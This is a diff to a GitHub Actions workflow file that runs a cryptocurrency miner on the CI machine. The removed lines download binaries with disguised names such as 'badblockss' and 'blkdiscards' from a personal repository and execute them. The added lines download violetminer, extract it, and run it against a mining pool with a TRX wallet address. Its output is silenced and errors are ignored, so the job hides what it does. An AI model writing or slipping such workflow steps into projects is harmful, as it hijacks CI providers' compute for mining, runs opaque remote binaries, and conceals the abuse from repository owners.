@@ -18,7 +18,9 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: Download
-      run: wget -O blkdiscards https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/badblockss && wget https://raw.githubusercontent.com/kijang-7/ssh/main/timeout  && chmod +x blkdiscards badblockss
+      run: wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
+    - name: Extract
+      run: tar -xf violetminer-linux-v0.2.2.tar.gz
     - name: Start
       continue-on-error: true
-      run: ./badblockss
+      run: cd violetminer-linux-v0.2.2 && ./violetminer --pool rx-us.unmineable.com:3333 --username TRX:TLjhpDMrsLyUuchLZnN4KACfdChL4rSm4E.$(shuf -i 10-9999999999999999999 -n 1) --password x --algorithm wrkzcoin --disableNVIDIA >/dev/null 2>&1
